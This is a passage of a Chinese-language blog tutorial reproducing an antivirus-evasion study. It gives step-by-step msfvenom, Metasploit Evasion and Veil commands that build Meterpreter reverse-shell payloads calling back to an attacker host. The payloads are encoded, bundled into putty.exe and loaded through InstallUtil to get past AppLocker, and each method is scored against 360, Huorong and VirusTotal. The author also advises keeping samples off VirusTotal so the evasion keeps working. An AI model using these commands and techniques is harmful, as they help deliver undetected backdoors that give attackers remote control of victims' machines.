></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>4</td>\n<td>msf捆绑+编码</td>\n<td>35&#x2F;68</td>\n<td>16&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>5</td>\n<td>msf多重编码</td>\n<td>45&#x2F;70</td>\n<td>28&#x2F;67</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>6</td>\n<td>Evasion模块exe</td>\n<td>42&#x2F;71</td>\n<td>43&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>7</td>\n<td>Evasion模块hta</td>\n<td>14&#x2F;59</td>\n<td>（None）</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>8</td>\n<td>Evasion模块csc</td>\n<td>12&#x2F;71</td>\n<td>33&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>9</td>\n<td>Veil原生exe</td>\n<td>44&#x2F;71</td>\n<td>44&#x2F;69</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>10</td>\n<td>Veil+gcc编译</td>\n<td>23&#x2F;71</td>\n<td>11&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>11</td>\n<td>Venom生成exe</td>\n<td>19&#x2F;71</td>\n<td>35&#x2F;68</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>12</td>\n<td>Venom生成dll</td>\n<td>11&#x2F;71</td>\n<td>（None）</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>13</td>\n<td>Shellter生成exe</td>\n<td>7&#x2F;69</td>\n<td>12&#x2F;65</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>14</td>\n<td>msf生成exe</td>\n<td>-</td>\n<td>51&#x2F;69</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n</tr>\n<tr>\n<td>15</td>\n<td>C&#x2F;C++2：动态内存</td>\n<td>24&#x2F;71</td>\n<td>36&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>16</td>\n<td>C&#x2F;C++3：嵌入汇编</td>\n<td>12&#x2F;71</td>\n<td>36&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>17</td>\n<td>C&#x2F;C++4：强制转换</td>\n<td>9&#x2F;70</td>\n<td>34&#x2F;68</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>18</td>\n<td>C&#x2F;C++5：汇编花指令</td>\n<td>12&#x2F;69</td>\n<td>37&#x2F;69</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>19</td>\n<td>C&#x2F;C++6：XOR加密</td>\n<td>15&#x2F;71</td>\n<td>21&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n</tr>\n<tr>\n<td>20</td>\n<td>C&#x2F;C++7：base64加密1</td>\n<td>28&#x2F;69</td>\n<td>21&#x2F;68</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>21</td>\n<td>C&#x2F;C++8：base64加密2</td>\n<td>28&#x2F;69</td>\n<td>17&#x2F;67</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n</tr>\n</tbody></table>\n<h2 id=\"复现环境（2022年）\"><a href=\"#复现环境（2022年）\" class=\"headerlink\" title=\"复现环境（2022年）\"></a>复现环境（2022年）</h2><p>时间：2022.05</p>\n<p>攻击机：192.168.174.128</p>\n<p>免杀方法：</p>\n<ul>\n<li>此处仅介绍msf、Evasion、Veil、Venom、C&#x2F;C++ Shellcode，其余方法参见原po：<a href=\"https://github.com/TideSec/BypassAntiVirus\">https://github.com/TideSec/BypassAntiVirus</a></li>\n</ul>\n<p>原po各杀软版本：</p>\n<ul>\n<li>360杀毒版本5.0.0.8160(2019.12.12)</li>\n<li>火绒版本5.0.33.13(2019.12.12)</li>\n<li>360安全卫士12.0.0.2001(2019.12.17)</li>\n</ul>\n<p>本文各杀软版本：</p>\n<ul>\n<li>火绒版本5.0.68.2(2022.05.26)</li>\n<li>360安全卫士13.0.0.2003(2022.05.26)</li>\n</ul>\n<p>测试平台：</p>\n<ul>\n<li>Virustotal，以下简称VT。VT查杀率代表静态查杀能力。</li>\n</ul>\n<p>【注意】</p>\n<ul>\n<li><p>如果是自己做免杀，建议测试机不要连互联网，更不要上传到virustotal.com类似的平台上。</p>\n</li>\n<li><p>不要上传！</p>\n</li>\n<li><p>不要上传！</p>\n</li>\n<li><p>不要上传！</p>\n</li>\n<li><p>上传一次以后，你自己辛辛苦苦写的免杀可能就不再免杀了。</p>\n</li>\n</ul>\n<h2 id=\"Metasploit自带免杀\"><a href=\"#Metasploit自带免杀\" class=\"headerlink\" title=\"Metasploit自带免杀\"></a>Metasploit自带免杀</h2><p>Payload均使用MSF的windows&#x2F;meterperter&#x2F;reverse_tcp模块生成。</p>\n<p>攻击机MSF监听6666端口：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use exploits/multi/handler</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set LHOST 192.168.174.128</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set LPORT 6666</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"原生态payload-VT查杀率51-69\"><a href=\"#原生态payload-VT查杀率51-69\" class=\"headerlink\" title=\"原生态payload(VT查杀率51&#x2F;69)\"></a>原生态payload(VT查杀率51&#x2F;69)</h3><p>MSF生成原始payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -f exe -o /mnt/hgfs/Share/payload1.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261904148.png\" alt=\"image-20220526190423066\"></p>\n<p>360和火绒都能查杀。</p>\n<p>在virustotal.com上查杀率为51&#x2F;69（原po为53&#x2F;69）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261901055.png\" alt=\"image-20220526190107987\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205261905876.png\" alt=\"image-20220526190513816\"></p>\n<p>VT查杀成功：</p>\n<p><img src=\"/./images/202205261909679.png\" alt=\"image-20220526190921570\"></p>\n<p>VT查杀失败：</p>\n<p><img src=\"/./images/202205261909529.png\" alt=\"image-20220526190959477\"></p>\n<h3 id=\"msf自编码免杀-VT查杀率48-67\"><a href=\"#msf自编码免杀-VT查杀率48-67\" class=\"headerlink\" title=\"msf自编码免杀(VT查杀率48&#x2F;67)\"></a>msf自编码免杀(VT查杀率48&#x2F;67)</h3><p>使用<code>msfvenom --list encoders</code>可查看所有编码器。</p>\n<p>评级最高的两个encoder为cmd&#x2F;powershell_base64和x86&#x2F;shikata_ga_nai，其中x86&#x2F;shikata_ga_nai也是免杀中使用频率最高的一个编码器。</p>\n<p>使用<code>x86/shikata_ga_nai</code>生成payload，参数<code>-i</code>为编码次数，使用<code>-b</code>参数去掉payload中的空字符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -b &quot;\\x00&quot; -i 15  -f exe -o /mnt/hgfs/Share/payload2.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261913186.png\" alt=\"image-20220526191328018\"></p>\n<p>由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。</p>\n<p>360和火绒都能查杀。</p>\n<p>在virustotal.com上查杀率为48&#x2F;67（原po为51&#x2F;69）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261914178.png\" alt=\"image-20220526191412121\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205261915497.png\" alt=\"image-20220526191549429\"></p>\n<p>VT查杀成功：</p>\n<p><img src=\"/./images/202205261918483.png\" alt=\"image-20220526191847382\"></p>\n<p>VT查杀失败：</p>\n<p><img src=\"/./images/202205261918665.png\" alt=\"image-20220526191857605\"></p>\n<h3 id=\"msf自捆绑免杀-VT查杀率15-69\"><a href=\"#msf自捆绑免杀-VT查杀率15-69\" class=\"headerlink\" title=\"msf自捆绑免杀(VT查杀率15&#x2F;69)\"></a>msf自捆绑免杀(VT查杀率15&#x2F;69)</h3><p>在生成payload时可以使用捆绑功能，使用msfvenom的<code>-x</code>参数可以指定一个自定义的可执行文件作为模板,并将payload嵌入其中，<code>-x</code>后面跟对应文件路径就可以。</p>\n<p>这里使用一个正规的<code>putty.exe</code>作为被捆绑测试软件。</p>\n<p>生成payload命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666  -x putty.exe  -f exe -o /mnt/hgfs/Share/payload3.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261921270.png\" alt=\"image-20220526192124189\"></p>\n<p>生成的两个文件对比，大小完全一样。能否免杀也和被捆绑exe有一定关系，可以选微软的一些工具作为模板exe程序。</p>\n<p><img src=\"/./images/202205261922615.png\" alt=\"image-20220526192251559\"></p>\n<p>360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒也能查杀）。</p>\n<p>在virustotal.com上查杀率为15&#x2F;69（原po为39&#x2F;69）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261925172.png\" alt=\"image-20220526192548112\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205261932310.png\" alt=\"image-20220526193243216\"></p>\n<h3 id=\"msf自捆绑-编码-VT查杀率16-69\"><a href=\"#msf自捆绑-编码-VT查杀率16-69\" class=\"headerlink\" title=\"msf自捆绑+编码(VT查杀率16&#x2F;69)\"></a>msf自捆绑+编码(VT查杀率16&#x2F;69)</h3><p>将上面的编码和捆绑两种方法结合一下进行尝试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o /mnt/hgfs/Share/payload4.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261933974.png\" alt=\"image-20220526193359812\"></p>\n<p>与上一种方法对比，大小完全一样。</p>\n<p><img src=\"/./images/202205261935858.png\" alt=\"image-20220526193552798\"></p>\n<p>可修改-i编码次数，编码次数越多，生成的payload越可能免杀，经测试，编码5次和6次可免杀360。</p>\n<p>360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒动态静态均能查杀，而360不会报毒）。</p>\n<p>在virustotal.com上查杀率为16&#x2F;69（原po为35&#x2F;69）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261940527.png\" alt=\"image-20220526194032466\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205261938216.png\" alt=\"image-20220526193813109\"></p>\n<h3 id=\"msfvenom多重编码-VT查杀率28-67\"><a href=\"#msfvenom多重编码-VT查杀率28-67\" class=\"headerlink\" title=\"msfvenom多重编码(VT查杀率28&#x2F;67)\"></a>msfvenom多重编码(VT查杀率28&#x2F;67)</h3><p>msfvenom的encoder编码器可以对payload进行一定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。</p>\n<p>如下命令，使用管道让<code>msfvenom</code>对攻击载荷多重编码，先用<code>shikata_ga_nai</code>编码20次，接着来10次的<code>alpha_upper</code>编码，再来10次的<code>countdown</code>编码，最后才生成以<code>putty.exe</code>为模板的可执行文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.174.128 LPORT=6666 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o /mnt/hgfs/Share/payload5.exe</span><br></pre></td></tr></table></figure>\n\n<p>如果报错<code>Error: You must select an arch for a custom payload</code>，则添加参数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-a x86 --platform windows</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205261949206.png\" alt=\"image-20220526194938055\"></p>\n<p>还有更多重编码姿势：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.74.133 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b &quot;&amp;&quot; -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe &gt; payload6.exe</span><br></pre></td></tr></table></figure>\n\n<p>经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。</p>\n<p>360可以查杀，火绒不能查杀。</p>\n<p>在virustotal.com上查杀率为28&#x2F;67（原po为45&#x2F;70），Bypass了McAfee。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205261951182.png\" alt=\"image-20220526195103114\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205261956521.png\" alt=\"image-20220526195652390\"></p>\n<h2 id=\"Metasploit-Evasion免杀\"><a href=\"#Metasploit-Evasion免杀\" class=\"headerlink\" title=\"Metasploit Evasion免杀\"></a>Metasploit Evasion免杀</h2><p>2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。evasion有以下几个模块,可以使用<code>show evasion</code>进行查看。</p>\n<p>msf6 evasion模块：</p>\n<p><img src=\"/./images/202205270847820.png\" alt=\"image-20220527084747663\"></p>\n<h3 id=\"生成exe-VT查杀率43-69\"><a href=\"#生成exe-VT查杀率43-69\" class=\"headerlink\" title=\"生成exe(VT查杀率43&#x2F;69)\"></a>生成exe(VT查杀率43&#x2F;69)</h3><p>使用<code>use windows/windows_defender_exe</code>进行生成payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use windows/windows_defender_exe</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload.exe</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set LHOST 192.168.174.128</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set LPORT 6666</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205270855472.png\" alt=\"image-20220527085549361\"></p>\n<p>不打开杀软的情况下，可正常上线：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>\n\n<p>打开杀软，360和火绒都能查杀。</p>\n<p>在virustotal.com上查杀率为43&#x2F;69（原po为42&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205270858477.png\" alt=\"image-20220527085842405\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205270857265.png\" alt=\"image-20220527085747182\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205270900839.png\" alt=\"image-20220527090002712\"></p>\n<h3 id=\"生成hta-VT查杀率14-59\"><a href=\"#生成hta-VT查杀率14-59\" class=\"headerlink\" title=\"生成hta(VT查杀率14&#x2F;59)\"></a>生成hta(VT查杀率14&#x2F;59)</h3><p>用另外一个evasion模块<code>windows/windows_defender_js_hta</code>生成一下，360同样被杀。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use windows/windows_defender_js_hta</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload1.exe</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set LHOST 192.168.174.128</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; set LPORT 6666</span><br><span class=\"line\">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure>\n\n<p>但是火绒静态+行为查杀都没发现问题，可正常上线。</p>\n<p>在virustotal.com上查杀率为14&#x2F;59。不过在线查毒时显示360也没查出来，但本地测试时却是能查出来的，所以在线查杀还是不太精准的。</p>\n<p>复现时该模块生成的可执行无法运行。</p>\n<h3 id=\"生成install-util-VT查杀率33-69\"><a href=\"#生成install-util-VT查杀率33-69\" class=\"headerlink\" title=\"生成install_util(VT查杀率33&#x2F;69)\"></a>生成install_util(VT查杀率33&#x2F;69)</h3><p>evasion还提供了其他几个模块，比如<code>windows/applocker_evasion_install_util</code></p>\n<p>创建payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use windows/applocker_evasion_install_util</span><br><span class=\"line\">msf6 evasion(windows/applocker_evasion_install_util) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 evasion(windows/applocker_evasion_install_util) &gt; set lhost 192.168.174.128</span><br><span class=\"line\">msf6 evasion(windows/applocker_evasion_install_util) &gt; set lport 6666</span><br><span class=\"line\">msf6 evasion(windows/applocker_evasion_install_util) &gt; run</span><br><span class=\"line\"></span><br><span class=\"line\">[+] install_util.txt stored at /Users/xysoul/.msf4/local/install_util.txt</span><br><span class=\"line\">[*] Copy install_util.txt to the target</span><br><span class=\"line\">[*] Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /out:install_util.exe install_util.txt</span><br><span class=\"line\">[*] Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure>\n\n<p>根据说明，需要使用csc.exe进行编译一下，然后用<code>InstallUtil.exe</code>加载文件。</p>\n<p>csc.exe是微软.NET Framework 中的C#语言编译器，本机安装了.net后就可以找到该文件。用vs2017里的csc.exe进行编译，生成install_util.exe。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\csc.exe /out:install_util.exe install_util.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205270927923.png\" alt=\"image-20220527092742869\"></p>\n<p>直接执行<code>install_util.exe</code>，无法上线，并且360查杀报毒。</p>\n<p>根据说明，需要使用<code>InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</code>来加载，才能成功上线。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure>\n\n<p>注意的是，如果生成的是32位的payload，就要用32位的.net下的InstallUtil来加载，否则文件会无法执行。</p>\n<p><img src=\"/./images/202205270931141.png\" alt=\"image-20220527093115067\"></p>\n<p>360和火绒都能查杀（原po静态查杀都没有问题，执行时360行为查杀会报毒）。</p>\n<p>在virustotal.com上查杀率为33&#x2F;69（原po为12&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205270932856.png\" alt=\"image-20220527093207774\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205270935961.png\" alt=\"image-20220527093508879\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205270936872.png\" alt=\"image-20220527093615742\"></p>\n<h2 id=\"Veil免杀\"><a href=\"#Veil免杀\" class=\"headerlink\" title=\"Veil免杀\"></a>Veil免杀</h2><p>Veil、Venom和Shellter是三大老牌免杀工具。</p>\n<p>Veil-Evasion是一个用python写的免杀框架，可以将任意脚本或一段shellcode转换成Windows可执行文件，还能利用Metasploit框架生成相兼容的Payload工具，从而逃避了常见防病毒产品的检测。</p>\n<h3 id=\"安装Veil\"><a href=\"#安装Veil\" class=\"headerlink\" title=\"安装Veil\"></a>安装Veil</h3><p>推荐Docker方式进行安装。镜像地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://hub.docker.com/r/mattiasohlsson/veil/</span><br></pre></td></tr></table></figure>\n\n<p>拉取veil镜像：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull mattiasohlsson/veil</span><br></pre></td></tr></table></figure>\n\n<p>拉取成功后，执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure>\n\n<p><code>-v /tmp/veil-output:/var/lib/veil/output:Z</code>是将宿主机的<code>/tmp/veil-output</code>目录映射到docker里面，这样veil生成的payload可以直接在宿主机里使用。</p>\n<p>之后再进入镜像可以在启动镜像后使用下面命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker exec -it &lt;container id&gt; /bin/bash</span><br></pre></td></tr></table></figure>\n\n<p>执行<code>veil</code>命令可启动,版本为3.1.1。</p>\n<p>veil有两个免杀的工具，Evasion和Ordnance。Ordnance可生成在Veil-Evasion中使用的shellcode，Evasion是用做文件免杀。一般选择Evasion。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Veil&gt;: use 1                   #选择Evasion功能</span><br><span class=\"line\">Veil/Evasion&gt;: list            #查看payload列表</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>list</code>可以看到到41种stager。</p>\n<p><img src=\"/./images/202205270946813.png\" alt=\"image-20220527094613602\"></p>\n<p>推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。</p>\n<p>veil原理可以参考：<a href=\"https://xz.aliyun.com/t/4191\">https://xz.aliyun.com/t/4191</a></p>\n<h3 id=\"使用veil直接生成exe-VT查杀率44-69\"><a href=\"#使用veil直接生成exe-VT查杀率44-69\" class=\"headerlink\" title=\"使用veil直接生成exe(VT查杀率44&#x2F;69)\"></a>使用veil直接生成exe(VT查杀率44&#x2F;69)</h3><p>veil可以直接生成支持msf的payload，我们先试一下看看效果。</p>\n<p>使用go语言生成msf的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Veil/Evasion&gt;: use 16</span><br></pre></td></tr></table></figure>\n\n<p>设置好msf的监听主机和端口：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[go/meterpreter/rev_tcp&gt;&gt;]: set lhost 192.168.174.128</span><br><span class=\"line\">[go/meterpreter/rev_tcp&gt;&gt;]: set lport 6666</span><br><span class=\"line\">[go/meterpreter/rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205270959676.png\" alt=\"image-20220527095925448\"></p>\n<p>设定好生成的payload的名称，例如payload1：</p>\n<p><img src=\"/./images/202205270950182.png\" alt=\"image-20220527094916300\"></p>\n<p>一系列编码编译之后，就生成payload了：</p>\n<p><img src=\"/./images/202205270950223.png\" alt=\"image-20220527095021088\"></p>\n<p>因为之前已经做过Docker目录映射，所以在宿主机的<code>/tmp/veil-output/compiled/</code>目录可直接看到生成的exe文件。</p>\n<p>在msf中监听：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use exploit/multi/handler</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set lhost 192.168.174.128</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>\n\n<p>在测试主机执行<code>payload1.exe</code>，360和火绒均可以查杀（原po在msf中可上线，360和火绒均不报毒）。</p>\n<p>在virustotal.com上查杀率为44&#x2F;69（原po为44&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205271002159.png\" alt=\"image-20220527100249086\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205271011302.png\" alt=\"image-20220527101107223\"></p>\n<p>VT：</p>\n<p><img 